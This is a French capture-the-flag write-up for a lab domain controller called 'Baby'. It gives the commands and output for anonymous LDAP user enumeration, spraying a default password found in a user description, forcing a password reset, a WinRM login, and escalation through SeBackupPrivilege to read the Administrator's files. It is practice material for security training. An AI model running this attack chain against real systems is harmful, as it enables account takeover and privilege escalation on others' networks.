# Baby

IP : 10.129.23.33
/etc/hosts : 10.129.23.33	baby.vl BabyDC.baby.vl



## USER


apres un scan nmap on voit que le ldap est actif on peut alors utiliser netexec avec le protocole ldap :

	nxc ldap 10.129.23.33 -u "" -p "" --users

		LDAP        10.129.23.33    389    BABYDC           -Username-                    -Last PW Set-       -BadPW-  -Description-               
		LDAP        10.129.23.33    389    BABYDC           Guest                         <never>             0        Built-in account for guest access to the computer/domain
		LDAP        10.129.23.33    389    BABYDC           Jacqueline.Barnett            2021-11-21 16:11:03 0                                    
		LDAP        10.129.23.33    389    BABYDC           Ashley.Webb                   2021-11-21 16:11:03 0                                    
		LDAP        10.129.23.33    389    BABYDC           Hugh.George                   2021-11-21 16:11:03 0                                    
		LDAP        10.129.23.33    389    BABYDC           Leonard.Dyer                  2021-11-21 16:11:03 0                                    
		LDAP        10.129.23.33    389    BABYDC           Connor.Wilkinson              2021-11-21 16:11:08 0                                    
		LDAP        10.129.23.33    389    BABYDC           Joseph.Hughes                 2021-11-21 16:11:08 0                                    
		LDAP        10.129.23.33    389    BABYDC           Kerry.Wilson                  2021-11-21 16:11:08 0                                    
		LDAP        10.129.23.33    389    BABYDC           Teresa.Bell                   2021-11-21 16:14:37 0        Set initial password to BabyStart123!

En faisant cela tous les utilsiateur n'apparaisse pas 
	ldapsearch -x -b "dc=baby,dc=vl" "(objectClass=user)" -H ldap://BabyDC.baby.vl 
		sAMAccountName: Guest
		sAMAccountName: Jacqueline.Barnett
		sAMAccountName: Ashley.Webb
		sAMAccountName: Hugh.George
		sAMAccountName: Leonard.Dyer
		sAMAccountName: Connor.Wilkinson
		sAMAccountName: Joseph.Hughes
		sAMAccountName: Kerry.Wilson
		sAMAccountName: Teresa.Bell

En faisant la requete ldap on voit directement plus d'utilisateur.
On peut afficher toutes les inforamtions du ldap avec la commande :

	ldapsearch -x -b "dc=baby,dc=vl" "(objectClass=user)" -H ldap://BabyDC.baby.vl
	ldapsearch -x -b "dc=baby,dc=vl"  -H ldap://BabyDC.baby.vl | grep "member:"

On voit sur l'utilsiateur Teresa.Bell le mot de passe par défaut
	BabyStart123!


On peut tester pour voir qui a ce mot de passe :
	nxc ldap 10.129.23.33 -u users.txt -p 'BabyStart123!' --no-bruteforce
		LDAP        10.129.23.33    389    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE

On voit que le l'utilsiateur Caroline.Robinson doit changer son mot de passe 
On peut alors le modifier grace a  un module netexec
	nxc smb 10.129.23.33 -u 'Caroline.Robinson' -p 'BabyStart123!' -M change-password -o NEWPASS=Azerty123!

On peut tester l'execution de commande :
	nxc smb 10.129.23.33 -u 'Caroline.Robinson' -p 'Azerty123!' -x whoami
		SMB         10.129.23.33    445    BABYDC           [+] baby.vl\Caroline.Robinson:Azerty123!



On peut maintenant se connecter a son compte via Evilwinrm : 
	evil-winrm -u "Caroline.Robinson" -p "Azerty123\!" -i "10.129.22.245"




## ADMIN

Pour voir les privilège de Caroline.Robinson : 
	whoami /all


On voit que l'on fait partie des groupes : 
	SeBackupPrivilege
	SeRestorePrivilege


lient de priv esc : https://github.com/giuliano108/SeBackupPrivilege/tree/master


il faut télécharger les .dll suivant : 
	SeBackupPrivilegeCmdLets.dll
	SeBackupPrivilegeUtils.dll

Pour les importer sur la machine :
	upload SeBackupPrivilegeCmdLets.dll
	upload SeBackupPrivilegeUtils.dll

Il faut ensuite import les modulde dans la machine WIndows : 
	Import-Module .\SeBackupPrivilegeCmdLets.dll
	Import-Module .\SeBackupPrivilegeUtils.dll


On peut maintenant utiliser la commande pour copier les fichier avec les privigere d'admin.
Par exemple :
	Copy-FileSeBackupPrivilege C:/Users/Administrator/Desktop/root.txt C:/Users/Caroline.Robinson/Desktop/root.txt



